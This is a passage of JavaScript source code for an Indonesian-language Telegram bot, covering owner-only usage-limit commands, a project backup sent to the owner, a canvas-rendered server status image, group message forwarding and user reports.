          `<blockquote>📤 <b>Broadcast Progress</b>\n\n📊 <b>Total User:</b> ${formatNumber(targetUsers.length)}\n📈 <b>Progress:</b> ${formatNumber(currentIndex)}/${formatNumber(targetUsers.length)} (${progressPercent}%)\n✅ <b>Sukses:</b> ${formatNumber(sukses)}\n❌ <b>Gagal:</b> ${formatNumber(gagal)}\n⏱️ <b>Waktu:</b> ${elapsedTime}s</blockquote>`,
          { parse_mode: "HTML" }
        );
      } catch (e) {
      }

      if (currentIndex < targetUsers.length) {
        await new Promise(r => setTimeout(r, DELAY_BETWEEN_BATCH));
      }
    }

    const totalTime = Math.floor((Date.now() - startTime) / 1000) || 1;
    const successRate = targetUsers.length > 0 ? ((sukses / targetUsers.length) * 100).toFixed(1) : 0;

    try {
      await ctx.telegram.editMessageText(
        chatId,
        progressMsg.message_id,
        undefined,
        `<blockquote>✅ <b>BROADCAST SELESAI</b>\n\n📊 <b>Statistik:</b>\n• <b>Total User:</b> ${formatNumber(targetUsers.length)}\n• <b>Sukses:</b> ${formatNumber(sukses)}\n• <b>Gagal:</b> ${formatNumber(gagal)}\n• <b>Success Rate:</b> ${successRate}%\n⏱️ <b>Waktu:</b> ${totalTime}s\n📈 <b>Kecepatan:</b> ${(targetUsers.length/totalTime).toFixed(1)} ops/s</blockquote>`,
        { parse_mode: "HTML" }
      );
    } catch (e) { /* ignore */ }

    console.log(chalk.green(`✅ BROADCAST COMPLETED`));
  } catch (err) {
    console.error(chalk.red("❌ Broadcast error:"), err);
    try {
      await ctx.reply(`<blockquote>❌ Broadcast error: ${err.message || err}</blockquote>`, { parse_mode: "HTML" });
    } catch(e) {}
  } finally {
    broadcastLock.delete(userId);
  }
});


// -------------------- [ Command : Add Limit ] -------------------- \\
bot.command("addlimit", async (ctx) => {
    const userId = ctx.from.id.toString();

    if (!isOwner(userId)) {
        return sendNotifAdminOrOwner(ctx);
    }

    const args = ctx.message.text.split(" ").slice(1);
    if (args.length < 2) {
        return ctx.reply(
            "❌ Syntax Error!\n\nUse : /addlimit <user_id> <Limit>"
        );
    }

    const targetId = args[0];
    const amount = parseInt(args[1]);

    if (isNaN(amount) || amount <= 0) {
        return ctx.reply("❌ Jumlah limit harus angka positif!");
    }

    const userInfo = getUserInfo(targetId);
    if (!userInfo) {
        return ctx.reply(`❌ User dengan ID ${targetId} tidak ditemukan di database!`);
    }

    let result;
    try {
        result = addLimitToUser(targetId, amount);
        
        if (!result || !result.success) {
            return ctx.reply("❌ Gagal menambahkan limit! Cek logs untuk detail.");
        }
    } catch (error) {
        console.error(chalk.red(`❌ Error adding limit: ${error.message}`));
        return ctx.reply("❌ Terjadi kesalahan saat menambah limit!");
    }

    // Ambil data limit
    const updatedLimit = getUserLimitFromFile(targetId);
    try {
        await ctx.telegram.sendMessage(
            targetId,
            `<blockquote>🎉 <b>Limit Anda Bertambah!</b>\n\n✅ <b>Admin telah menambahkan limit untuk Anda</b>\n📈 <b>Total Limit:</b> ${formatNumber(updatedLimit.dailyLimit || result.newDailyLimit)}\n📊 <b>Sisa limit:</b> ${formatNumber(updatedLimit.remaining || result.newRemaining)}\n➕ <b>Ditambahkan:</b> ${formatNumber(amount)} limit\n\nTerima kasih telah menggunakan bot! 🚀</blockquote>`,
            { parse_mode: "HTML" }
        );
    } catch (error) {
        console.log(chalk.yellow(`⚠️ Tidak bisa kirim notifikasi ke user: ${error.message}`));
    }

    await ctx.reply(
        `<blockquote>✅ <b>Limit berhasil ditambahkan!</b>\n\n👤 User: ${userInfo.firstName || "Unknown"} (@${userInfo.username || "no_username"})\n🆔 ID: <code>${targetId}</code>\n📈 <b>Total Limit:</b> ${formatNumber(updatedLimit.dailyLimit || result.newDailyLimit)}\n📊 <b>Sisa limit:</b> ${formatNumber(updatedLimit.remaining || result.newRemaining)}\n➕ <b>Ditambahkan:</b> ${formatNumber(amount)} limit</blockquote>`,
        { parse_mode: "HTML" }
    );

    console.log(chalk.green(`✅ ${userId} added ${amount} limit to ${targetId}. New total: ${updatedLimit.dailyLimit || result.newDailyLimit}`));
});

// -------------------- [ Command : Set Limit ] -------------------- \\
bot.command("setlimit", async (ctx) => {
    const userId = ctx.from.id.toString();

    if (!isOwner(userId)) {
        return sendNotifAdminOrOwner(ctx);
    }

    const args = ctx.message.text.split(" ").slice(1);
    if (args.length < 1) {
        return ctx.reply(
            "❌ Syntax Error!\n\nUse : /setlimit <jumlah>\nExample : /setlimit 20\n\n© AldzyIsHere"
        );
    }

    const dailyLimit = parseInt(args[0]);

    if (isNaN(dailyLimit) || dailyLimit <= 0) {
        return ctx.reply("❌ Jumlah limit harus angka positif!");
    }

    const allLimits = getAllLimits();
    let updatedCount = 0;
    let notifiedCount = 0;

    for (const userId in allLimits) {
        setUserLimit(userId, dailyLimit);
        updatedCount++;

        try {
            await ctx.telegram.sendMessage(
                userId,
                `<blockquote>⚙️ <b>Limit Anda Telah Diatur Admin!</b></blockquote>\n` +
                `📈 <b>Limit hari ini:</b> ${formatNumber(dailyLimit)}`,
                { parse_mode: "HTML" }
            );
            notifiedCount++;
        } catch (error) {
            console.log(chalk.yellow(`⚠️ Tidak bisa kirim notifikasi ke user ${userId}: ${error.message}`));
        }

        if (updatedCount % 10 === 0) {
            await sleep(100);
        }
    }

    await ctx.reply(
        `<blockquote>✅ <b>Semua Limit Berhasil Diatur!</b>\n\n📊 <b>Total user:</b> ${formatNumber(updatedCount)} user\n📈 <b>Limit:</b> ${formatNumber(dailyLimit)} per user\n📨 <b>Notifikasi terkirim:</b> ${formatNumber(notifiedCount)} user\n\nSemua user sekarang memiliki limit ${formatNumber(dailyLimit)} per hari.</blockquote>`,
        { parse_mode: "HTML" }
    );

    console.log(chalk.green(`✅ All limits set to ${formatNumber(dailyLimit)} by ${userId}`));
});

// -------------------- [ Command : Reset Limit ] -------------------- \\
bot.command("resetlimit", async (ctx) => {
    const userId = ctx.from.id.toString();

    if (!isOwner(userId)) {
        return sendNotifAdminOrOwner(ctx);
    }

    const resetCount = resetAllLimits();

    await ctx.reply(
        `<blockquote>🔄 <b>Semua Limit Telah Direset!</b>\n\n✅ <b>Berhasil mereset ${formatNumber(resetCount)} users</b>\n⏰ <b>Reset waktu:</b> ${new Date().toLocaleString('id-ID')}\n\nSemua user sekarang memiliki limit penuh kembali.</blockquote>`,
        { parse_mode: "HTML" }
    );

    console.log(chalk.green(`✅ All limits reset by ${userId}`));
});

// -------------------- [ Command : Backup ] -------------------- \\
bot.command("backup", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) {
        return ctx.reply("❌ Command ini khusus Owner.");
    }

    try {
        await ctx.reply("⏳ Sedang membuat backup, mohon tunggu...");

        const backupDir = "./backup";
        if (!fs.existsSync(backupDir)) {
            fs.mkdirSync(backupDir, { recursive: true });
        }

        const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
        const backupFolder = path.join(backupDir, `Backup-${timestamp}`);
        fs.mkdirSync(backupFolder, { recursive: true });

        const rootDir = process.cwd();
        const zipName = `Backup-${Date.now()}.zip`;
        const zipPath = path.join(rootDir, zipName);

        const output = fs.createWriteStream(zipPath);
        const archive = archiver("zip", { zlib: { level: 9 } });

        await ctx.reply("⏳ Mengumpulkan source code...");

        output.on("close", async () => {
            try {
                const finalZipPath = path.join(
                    backupDir,
                    `Van-Backup-${timestamp}.zip`
                );
                fs.renameSync(zipPath, finalZipPath);

                const stats = fs.statSync(finalZipPath);
                const MAX_TELEGRAM_SIZE = 200 * 1024 * 1024; 
                const fileSize = formatBytes(stats.size);
                if (stats.size > MAX_TELEGRAM_SIZE) {
                    return ctx.reply(
                        `⚠️ Backup BERHASIL dibuat\n\n` +
                        `💾 Size: ${fileSize}\n` +
                        `📁 File: ${path.basename(finalZipPath)}\n\n` +
                        `❌ Tidak dikirim ke Telegram (file terlalu besar)`
                    );
                }

                await ctx.replyWithDocument(
                    { source: finalZipPath, filename: `Backup-${timestamp}.zip` },
                    {
                        caption: `✅ Backup berhasil!
💾 Size: ${fileSize}
⏰ Waktu: ${new Date().toLocaleString("id-ID")}
📁 Semua file dan folder telah di-backup`
                    }
                );

                if (fs.existsSync(backupFolder)) {
                    fs.rmSync(backupFolder, { recursive: true, force: true });
                }

            } catch (err) {
                console.error("❌ Backup Process Error:", err);
                ctx.reply("❌ Backup gagal, cek log server.");
            }
        });

        archive.on("error", async (err) => {
            console.error("[ARCHIVE ERROR]", err);
            if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);
            
            if (fs.existsSync(backupFolder)) {
                fs.rmSync(backupFolder, { recursive: true, force: true });
            }

            await ctx.reply("❌ Backup gagal, terjadi error saat membuat arsip ZIP.");
        });

        archive.pipe(output);

        archive.glob("**/*", {
            cwd: rootDir,
            ignore: [
                "node_modules/**",
                ".npm/**",
                "package-lock.json",
                "backup/**",
                zipName
            ]
        });

        archive.finalize();

    } catch (err) {
        console.error("❌ Backup Error:", err);
        ctx.reply("❌ Backup gagal, cek log server.");
    }
});


// ---------- [ Command: Ping ] ------------ \\
bot.command(["ping", "speed"], async (ctx) => {
  try {
    const chatId = String(ctx.chat?.id || ctx.from?.id || 'default');
    
    // Hitung ping
    const start = Date.now();
    const latensi = Date.now() - start;
    
    // Info OS
    const platform = os.platform();
    const type = os.type();
    const release = os.release();
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    
    // Dapatkan IP
    let ip = "Tidak diketahui";
    try {
      const nets = os.networkInterfaces();
      for (const name of Object.keys(nets || {})) {
        for (const net of nets[name] || []) {
          if (net.family === "IPv4" && !net.internal) {
            ip = net.address;
            break;
          }
        }
      }
    } catch (e) {}

    // Dapatkan info disk
    let totalGb = "0.00", usedGb = "0.00", freeGb = "0.00";
    try {
      const { execSync } = require('child_process');
      const output = execSync('df -k /', { encoding: 'utf8', timeout: 2000 });
      const lines = output.split('\n');
      if (lines.length > 1) {
        const parts = lines[1].split(/\s+/);
        if (parts.length >= 4) {
          const total = parseInt(parts[1]) * 1024;
          const used = parseInt(parts[2]) * 1024;
          const avail = parseInt(parts[3]) * 1024;
          
          totalGb = (total / 1024 / 1024 / 1024).toFixed(2);
          usedGb = (used / 1024 / 1024 / 1024).toFixed(2);
          freeGb = (avail / 1024 / 1024 / 1024).toFixed(2);
        }
      }
    } catch (e) {}

    // runtime
    const getRuntime = (seconds) => {
      const days = Math.floor(seconds / 86400);
      const hours = Math.floor((seconds % 86400) / 3600);
      const minutes = Math.floor((seconds % 3600) / 60);
      const secs = Math.floor(seconds % 60);
      
      const parts = [];
      if (days > 0) parts.push(`${days} Hari`);
      if (hours > 0) parts.push(`${hours} Jam`);
      if (minutes > 0) parts.push(`${minutes} Menit`);
      if (secs > 0 || parts.length === 0) parts.push(`${secs} Detik`);
      
      return parts.join(' ');
    };

    const { createCanvas } = require('canvas');
    
    // Ukuran
    const width = 900;
    const height = 600;
    
    // Buat canvas
    const canvas = createCanvas(width, height);
    const ctx2 = canvas.getContext('2d');
    
    // Background
    const gradient = ctx2.createLinearGradient(0, 0, 0, height);
    gradient.addColorStop(0, '#2c3e50');
    gradient.addColorStop(1, '#34495e');
    
    ctx2.fillStyle = gradient;
    ctx2.fillRect(0, 0, width, height);
    
    // Header dengan background putih transparan
    ctx2.fillStyle = 'rgba(255, 255, 255, 0.05)';
    ctx2.fillRect(0, 0, width, 100);
    
    // Garis pemisah halus
    ctx2.strokeStyle = 'rgba(255, 255, 255, 0.1)';
    ctx2.lineWidth = 1;
    ctx2.beginPath();
    ctx2.moveTo(0, 100);
    ctx2.lineTo(width, 100);
    ctx2.stroke();
    
    // Title
    ctx2.fillStyle = '#ecf0f1';  // putih abu
    ctx2.font = 'bold 36px "Segoe UI", "Arial", sans-serif';
    ctx2.textAlign = 'center';
    ctx2.fillText('SERVER STATUS ⚡', width / 2, 60);
    
    // Subtitle
    ctx2.fillStyle = '#bdc3c7';  // abu terang
    ctx2.font = '14px "Segoe UI", "Arial", sans-serif';
    ctx2.fillText('Vyxxz! - BOT - @ReyValdz', width / 2, 85);
    
    // Container untuk info
    const boxStartY = 120;
    const boxHeight = 200;
    const boxWidth = 400;
    const spacing = 30;
    
    // Fungsi buat box dengan bayangan
    const drawBox = (x, y, title, icon) => {
      // Bayangan
      ctx2.shadowColor = 'rgba(0, 0, 0, 0.3)';
      ctx2.shadowBlur = 10;
      ctx2.shadowOffsetY = 5;
      
      // Background box
      ctx2.fillStyle = 'rgba(255, 255, 255, 0.08)';
      ctx2.beginPath();
      ctx2.roundRect(x, y, boxWidth, boxHeight, 15);
      ctx2.fill();
      
      // Border subtle
      ctx2.shadowBlur = 0;
      ctx2.strokeStyle = 'rgba(255, 255, 255, 0.1)';
      ctx2.lineWidth = 1;
      ctx2.beginPath();
      ctx2.roundRect(x, y, boxWidth, boxHeight, 15);
      ctx2.stroke();
      
      // Title box
      ctx2.fillStyle = 'rgba(52, 73, 94, 0.9)';
      ctx2.beginPath();
      ctx2.roundRect(x + 20, y - 15, 150, 35, 10);
      ctx2.fill();
      
      // Title text
      ctx2.fillStyle = '#ecf0f1';
      ctx2.font = 'bold 16px "Segoe UI", "Arial", sans-serif';
      ctx2.textAlign = 'left';
      ctx2.fillText(`${icon} ${title}`, x + 35, y + 10);
    };
    
    // Fungsi untuk rounded rectangle
    ctx2.roundRect = function(x, y, w, h, r) {
      if (w < 2 * r) r = w / 2;
      if (h < 2 * r) r = h / 2;
      this.moveTo(x + r, y);
      this.lineTo(x + w - r, y);
      this.quadraticCurveTo(x + w, y, x + w, y + r);
      this.lineTo(x + w, y + h - r);
      this.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
      this.lineTo(x + r, y + h);
      this.quadraticCurveTo(x, y + h, x, y + h - r);
      this.lineTo(x, y + r);
      this.quadraticCurveTo(x, y, x + r, y);
      return this;
    };
    
    // Reset shadow
    ctx2.shadowColor = 'transparent';
    
    // Box Network
    drawBox(40, boxStartY, 'NETWORK', '☐');
    
    ctx2.fillStyle = '#bdc3c7';
    ctx2.font = '14px "Segoe UI", "Arial", sans-serif';
    ctx2.fillText('Ping Response:', 70, boxStartY + 60);
    ctx2.fillText('IP Address:', 70, boxStartY + 100);
    
    ctx2.fillStyle = '#ecf0f1';
    ctx2.font = 'bold 20px "Segoe UI", "Arial", sans-serif';
    ctx2.fillText(`${latensi} ms`, 220, boxStartY + 60);
    ctx2.font = 'bold 16px "Segoe UI", "Arial", sans-serif';
    ctx2.fillText(ip, 220, boxStartY + 100);
    
    // Box server
    drawBox(460, boxStartY, 'SERVER', '☐');
    
    ctx2.fillStyle = '#bdc3c7';
    ctx2.font = '14px "Segoe UI", "Arial", sans-serif';
    ctx2.fillText('Platform:', 490, boxStartY + 60);
    ctx2.fillText('Type:', 490, boxStartY + 100);
    ctx2.fillText('Release:', 490, boxStartY + 140);
    
    ctx2.fillStyle = '#ecf0f1';
    ctx2.font = 'bold 14px "Segoe UI", "Arial", sans-serif';
    ctx2.fillText(platform, 590, boxStartY + 60);
    ctx2.fillText(type, 590, boxStartY + 100);
    ctx2.fillText(release.substring(0, 15) + '...', 590, boxStartY + 140);
    
    // Box RAM - Lebar penuh
    const ramY = boxStartY + boxHeight + 30;
    
    // Background RAM box
    ctx2.fillStyle = 'rgba(255, 255, 255, 0.05)';
    ctx2.beginPath();
    ctx2.roundRect(40, ramY, width - 80, 100, 15);
    ctx2.fill();
    
    // Border
    ctx2.strokeStyle = 'rgba(255, 255, 255, 0.1)';
    ctx2.beginPath();
    ctx2.roundRect(40, ramY, width - 80, 100, 15);
    ctx2.stroke();
    
    // Title
    ctx2.fillStyle = '#ecf0f1';
    ctx2.font = 'bold 18px "Segoe UI", "Arial", sans-serif';
    ctx2.fillText('☐ MEMORY (RAM)', 70, ramY + 30);
    
    const totalRamGB = (totalMem / 1024 / 1024 / 1024).toFixed(2);
    const usedRamGB = (usedMem / 1024 / 1024 / 1024).toFixed(2);
    const ramPercent = (usedMem / totalMem * 100).toFixed(1);
    
    ctx2.fillStyle = '#bdc3c7';
    ctx2.font = '13px "Segoe UI", "Arial", sans-serif';
    ctx2.fillText(`Total: ${totalRamGB} GB`, 70, ramY + 60);
    ctx2.fillText(`Used: ${usedRamGB} GB`, 250, ramY + 60);
    ctx2.fillText(`Free: ${(totalRamGB - usedRamGB).toFixed(2)} GB`, 400, ramY + 60);
    
    ctx2.fillStyle = 'rgba(255, 255, 255, 0.1)';
    ctx2.beginPath();
    ctx2.roundRect(70, ramY + 70, 300, 8, 4);
    ctx2.fill();
    
    const barWidth = 300 * (usedMem / totalMem);
    const barGradient = ctx2.createLinearGradient(70, 0, 70 + barWidth, 0);
    barGradient.addColorStop(0, '#7f8c8d');
    barGradient.addColorStop(1, '#95a5a6');
    
    ctx2.fillStyle = barGradient;
    ctx2.beginPath();
    ctx2.roundRect(70, ramY + 70, barWidth, 8, 4);
    ctx2.fill();
    
    // Percentage
    ctx2.fillStyle = '#ecf0f1';
    ctx2.font = 'bold 14px "Segoe UI", "Arial", sans-serif';
    ctx2.fillText(`${ramPercent}%`, 380, ramY + 78);
    
    // Box DISK
    const diskY = ramY + 120;
    
    ctx2.fillStyle = 'rgba(255, 255, 255, 0.05)';
    ctx2.beginPath();
    ctx2.roundRect(40, diskY, width - 80, 100, 15);
    ctx2.fill();
    
    ctx2.strokeStyle = 'rgba(255, 255, 255, 0.1)';
    ctx2.beginPath();
    ctx2.roundRect(40, diskY, width - 80, 100, 15);
    ctx2.stroke();
    
    ctx2.fillStyle = '#ecf0f1';
    ctx2.font = 'bold 18px "Segoe UI", "Arial", sans-serif';
    ctx2.fillText('☐ DISK STORAGE', 70, diskY + 30);
    
    const diskPercent = (parseFloat(usedGb) / parseFloat(totalGb) * 100).toFixed(1);
    
    ctx2.fillStyle = '#bdc3c7';
    ctx2.font = '13px "Segoe UI", "Arial", sans-serif';
    ctx2.fillText(`Total: ${totalGb} GB`, 70, diskY + 60);
    ctx2.fillText(`Used: ${usedGb} GB`, 250, diskY + 60);
    ctx2.fillText(`Free: ${freeGb} GB`, 400, diskY + 60);
    
    ctx2.fillStyle = 'rgba(255, 255, 255, 0.1)';
    ctx2.beginPath();
    ctx2.roundRect(70, diskY + 70, 300, 8, 4);
    ctx2.fill();
    
    const diskBarWidth = 300 * (parseFloat(usedGb) / parseFloat(totalGb));
    const diskGradient = ctx2.createLinearGradient(70, 0, 70 + diskBarWidth, 0);
    diskGradient.addColorStop(0, '#7f8c8d');
    diskGradient.addColorStop(1, '#95a5a6');
    
    ctx2.fillStyle = diskGradient;
    ctx2.beginPath();
    ctx2.roundRect(70, diskY + 70, diskBarWidth, 8, 4);
    ctx2.fill();
    
    // Percentage
    ctx2.fillStyle = '#ecf0f1';
    ctx2.font = 'bold 14px "Segoe UI", "Arial", sans-serif';
    ctx2.fillText(`${diskPercent}%`, 380, diskY + 78);
    
    // Uptime box
    const uptimeY = diskY + 120;
    
    ctx2.fillStyle = 'rgba(255, 255, 255, 0.03)';
    ctx2.beginPath();
    ctx2.roundRect(40, uptimeY, width - 80, 50, 10);
    ctx2.fill();
    
    ctx2.fillStyle = '#95a5a6';
    ctx2.font = '14px "Segoe UI", "Arial", sans-serif';
    ctx2.textAlign = 'center';
    ctx2.fillText(`☐ SYSTEM UPTIME: ${getRuntime(process.uptime())}`, width / 2, uptimeY + 30);
    
    // Konversi 
    const buffer = canvas.toBuffer('image/png');
    await ctx.replyWithPhoto(
      { source: buffer },
      { 
        caption: `<blockquote>✅ <b>SERVER STATUS</b></blockquote>\n<pre>Ping: ${latensi} ms | Uptime: ${getRuntime(process.uptime())}</pre>`,
        parse_mode: "HTML" 
      }
    );

  } catch (err) {
    console.error('ping error:', err);
    try {
      const latensi = Date.now() - start || 0;
      const caption = `📡 PING: ${latensi} ms\n\n🖥 OS: ${os.platform()}\n💾 RAM: ${(os.totalmem() / 1024 / 1024 / 1024).toFixed(2)} GB\n⏳ Uptime: ${Math.floor(process.uptime() / 60)} menit`;
      await ctx.reply(caption);
    } catch (e) {}
  }
});

// ---------- [ Command Bot Settings Handler ] ------------ \\
bot.command("grouponly", (ctx) => {
    const args = ctx.message.text.split(" ");
    const mode = args[1]?.toLowerCase();
    const userId = ctx.from.id.toString();

    if (!isOwner(userId)) return sendNotifAdminOrOwner();

    if (mode !== "on" && mode !== "off") {
        return ctx.reply("❌ Syntax Error!\n\nExample : /grouponly 𝗈𝗇/𝗈𝖿𝖿");
    }

    const status = mode === "on";
    setGroupOnly(status);

    ctx.replyWithMarkdown(`Fitur *Group Only* sekarang: ${status ? "AKTIF" : "NONAKTIF"}`);
});
    
// -------------------- [ Command : Share ] -------------------- \\
bot.command("share", async (ctx) => {
    const userId = ctx.from.id.toString();
    const groupId = ctx.chat.id.toString();
    const replyMsg = ctx.message.reply_to_message;
    
    if (!isOwner(userId)) {
        return sendNotifAdminOrOwner(ctx);
    }

    if (!replyMsg) {
        return ctx.reply("🪧 Reply pesan yang ingin dibagikan\nContoh: Balas pesan lalu ketik /share");
    }

    // Cooldown 
    const now = Date.now();
    const delayMs = 2 * 60 * 1000; // 2 menit
    if (delaySharemsg[groupId] && now - delaySharemsg[groupId] < delayMs) {
        const sisaDetik = Math.ceil((delayMs - (now - delaySharemsg[groupId])) / 1000);
        const sisaMenit = Math.ceil(sisaDetik / 60);
        return ctx.reply(`🕐 Tunggu ${sisaMenit} menit lagi sebelum bisa menggunakan /share`);
    }

    delaySharemsg[groupId] = now;
    
    let groups = [];
    try {
        if (fs.existsSync(fileGroup)) {
            const data = fs.readFileSync(fileGroup, 'utf8');
            groups = JSON.parse(data);
        }
    } catch (err) {
        console.error(chalk.red(`❌ Error baca groups.json: ${err.message}`));
        return ctx.reply("❌ Error database. Coba restart bot.");
    }

    console.log(chalk.cyan(`📊 Grup di database: ${formatNumber(groups.length)}`));
    const targetGroups = groups.filter(id => id !== groupId);

    if (targetGroups.length === 0) {
        return ctx.reply("❌ Bot belum ada di grup lain. Tambahkan bot ke grup lain dulu!");
    }

    let sukses = 0;
    let gagal = 0;

    const reportMsg = await ctx.reply(
        `<blockquote>🎯 <b>Mulai Sharing...</b>\n\n📤 <b>Target:</b> ${formatNumber(targetGroups.length)} grup\n✅ <b>Berhasil:</b> 0\n❌ <b>Gagal:</b> 0\n⏳ <b>Progress:</b> 0/${formatNumber(targetGroups.length)}</blockquote>`,
        { parse_mode: "HTML" }
    );

    console.log(chalk.cyan(`🎯 Mulai kirim ke ${formatNumber(targetGroups.length)} grup:`));

    for (let i = 0; i < targetGroups.length; i++) {
        const targetId = targetGroups[i];

        try {
            await ctx.telegram.forwardMessage(
                targetId,
                ctx.chat.id,
                replyMsg.message_id
            );
            sukses++;
            console.log(chalk.green(`  ✅ ${formatNumber(i + 1)}. ${targetId}`));
        } catch (error) {
            gagal++;
            console.log(chalk.red(`  ❌ ${formatNumber(i + 1)}. ${targetId} - ${error.message}`));
            if (error.description && error.description.includes('kicked') ||
                error.description && error.description.includes('removed')) {
                console.log(chalk.yellow(`  🗑️ Hapus ${targetId} dari database`));
                groups = groups.filter(id => id !== targetId);
                fs.writeFileSync(fileGroup, JSON.stringify(groups));
            }
        }

        await sleep(300);
        
        if ((i + 1) % 5 === 0 || i + 1 === targetGroups.length) {
            try {
                await ctx.telegram.editMessageText(
                    ctx.chat.id,
                    reportMsg.message_id,
                    undefined,
                    `<blockquote>🎯 <b>Progress Sharing</b>\n\n📤 <b>Target:</b> ${formatNumber(targetGroups.length)} grup\n📈 <b>Progress:</b> ${formatNumber(i + 1)}/${formatNumber(targetGroups.length)}\n✅ <b>Berhasil:</b> ${formatNumber(sukses)}\n❌ <b>Gagal:</b> ${formatNumber(gagal)}\n⏳ ${i + 1 === targetGroups.length ? 'Selesai ✓' : 'Proses...'}</blockquote>`,
                    { parse_mode: "HTML" }
                );
            } catch (e) {
            }
        }
    }

    try {
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            reportMsg.message_id,
            undefined,
            `<blockquote>🎯 <b>Sharing Selesai!</b>\n\n📤 <b>Target:</b> ${formatNumber(targetGroups.length)} grup\n✅ <b>Berhasil:</b> ${formatNumber(sukses)}\n❌ <b>Gagal:</b> ${formatNumber(gagal)}\n📊 <b>Success:</b> ${((sukses / targetGroups.length) * 100).toFixed(1)}%\n⏱️ ${new Date().toLocaleTimeString('id-ID')}</blockquote>`,
            { parse_mode: "HTML" }
        );
    } catch (e) {
    }

    console.log(chalk.green(`✅ Share oleh di grup ${groupId}`));
});


// -------------------- [ Command : Cek limit ] -------------------- \\
bot.command("ceklimit", async (ctx) => {
    const userId = ctx.from.id.toString();
    const chatType = ctx.chat.type;
    const args = ctx.message.text.split(" ").slice(1);
    let targetId = userId;
    if ((isOwner(userId) || isAdminOrOwner(userId)) && args[0]) {
        targetId = args[0];
    }
    
    const userLimit = getUserLimit(targetId);
    const isPremiumUser = isPremium(targetId);
    const premiumStatus = isPremiumUser ? "✅ Premium" : "💸 Free User";
    let userInfo = { firstName: "Unknown", username: "" };
    try {
        const chat = await ctx.telegram.getChat(targetId);
        userInfo = {
            firstName: chat.first_name || chat.title || "Unknown",
            username: chat.username ? `@${chat.username}` : ""
        };
    } catch (error) {
        console.log(`Gagal mengambil info user ${targetId}:`, error.message);
    }
    
    const curilimitCooldown = checkCurilimitCooldown(userId);
    
    const limitInfo = `<blockquote>📊 <b>INFORMASI LIMIT</b>
👤 <b>User:</b> ${userInfo.firstName} ${userInfo.username}
🆔 <b>ID:</b> \`${targetId}\`
⭐ <b>Status:</b> ${premiumStatus}

📈 <b>Limit:</b> ${formatNumber(userLimit.dailyLimit)}
📊 <b>Sisa Limit:</b> ${formatNumber(userLimit.remaining)}
📉 <b>Terpakai Hari Ini:</b> ${formatNumber(userLimit.dailyLimit - userLimit.remaining)}
</blockquote>`.trim();

    await ctx.reply(limitInfo, { parse_mode: "HTML" });
});

// -------------------- [ Command : lapor ] -------------------- \\
bot.command("lapor", async (ctx) => {
  const laporan = ctx.message.text.split(" ").slice(1).join(" ");

  if (!laporan) {
    return ctx.reply("<b>⚠️ Format salah!</b>\n\nGunakan: /lapor isi laporan kamu", { parse_mode: "HTML" });
  }
  
  const userId = ctx.from.id.toString();
  let targetId = userId;
  const args = ctx.message.text.split(" ").slice(1);
  const laporanText = args.join(" ");
  
  if ((isOwner(userId) || isAdminOrOwner(userId)) && args[0] && !isNaN(args[0])) {
    targetId = args[0];
    const laporanArray = ctx.message.text.split(" ");
    laporanArray.shift();
    laporanArray.shift(); 
    laporan = laporanArray.join(" ");
  }
  
  let userInfo = {};
  try {
    userInfo = getUserInfo ? getUserInfo(targetId) : {};
  } catch (e) {
    console.error("Error getting user info:", e);
  }

  if (!userInfo || typeof userInfo !== 'object') {
    userInfo = {};
  }
  
  if (!userInfo.firstName && targetId === userId) {
    userInfo.firstName = ctx.from.first_name || "Unknown";
  }

  try {
    await ctx.telegram.sendMessage(
      OWNER_ID,
      `📢 <b>LAPORAN BARU</b>\n\n👤 Dari: ${userInfo.firstName || "Unknown"}\n🆔 ID: ${targetId}\n\n📝 Pesan:\n${laporan}`,
      { 
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: buttonsBot
        }
      }
    );

    ctx.reply("✅ Laporan kamu sudah terkirim ke owner!");
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Gagal mengirim laporan. Coba lagi nanti.");
  }
});

// -------------------- ( Command : List Partner ) --------------------
bot.command("listpt", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdminOrOwner(userId)) return sendNotifAdminOrOwner(ctx);
    const limitAllowed = await checkUserLimit(ctx, "listpt");
    if (!limitAllowed) return;

    partnerUsers = loadPartnerUsers();

    if (partnerUsers.length === 0) {
        return ctx.replyWithPhoto(menuimage(), {
            caption: `<blockquote>
<b>📋 𝖣𝖺𝖿𝗍𝖺𝗋 𝖯𝖺𝗋𝗍𝗇𝖾𝗋</b>

📭 Tidak ada user partner.

─────────────────────
𝖳𝗈𝗍𝖺𝗅: 0 𝗎𝗌𝖾𝗋</blockquote>`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "─ Contact Owner", url: "https://t.me/ReyValdz" }
                    ]
                ]
            }
        });
    }

    // Pagination
    const itemsPerPage = 8;
    const totalPages = Math.ceil(partnerUsers.length / itemsPerPage);

    const currentPage = 1;
    const startIndex = (currentPage - 1) * itemsPerPage;
    const endIndex = Math.min(startIndex + itemsPerPage, partnerUsers.length);
    const currentItems = partnerUsers.slice(startIndex, endIndex);

    let partnerList = "";
    let count = startIndex + 1;

    for (const partnerId of currentItems) {
        try {
            const userInfo = await getUserInfo(partnerId);
            partnerList += `${count}. ${userInfo.first_name} (@${userInfo.username}) - ID: ${partnerId}\n`;
            count++;
        } catch (error) {
            partnerList += `${count}. Unknown User - ID: ${partnerId}\n`;
            count++;
        }
    }

    const keyboard = [];
    if (totalPages > 1) {
        const row = [];
        if (currentPage > 1) {
            row.push({ text: "◀️ Sebelumnya", callback_data: `listpt_page_${currentPage - 1}` });
        }
        row.push({ text: `${currentPage}/${totalPages}`, callback_data: "no_action" });
        if (currentPage < totalPages) {
            row.push({ text: "Selanjutnya ▶️", callback_data: `listpt_page_${currentPage + 1}` });
        }
        keyboard.push(row);
    }

    keyboard.push([
        { text: "─ Contact Owner", url: "https://t.me/ReyValdz" }
    ]);

    await ctx.replyWithPhoto(menuimage(), {
        caption: `<blockquote>
<b>📋 𝖣𝖺𝖿𝗍𝖺𝗋 𝖯𝖺𝗋𝗍𝗇𝖾𝗋</b>

${partnerList}
─────────────────────
𝖧𝖺𝗅𝖺𝗆𝖺𝗇: ${currentPage}/${totalPages}
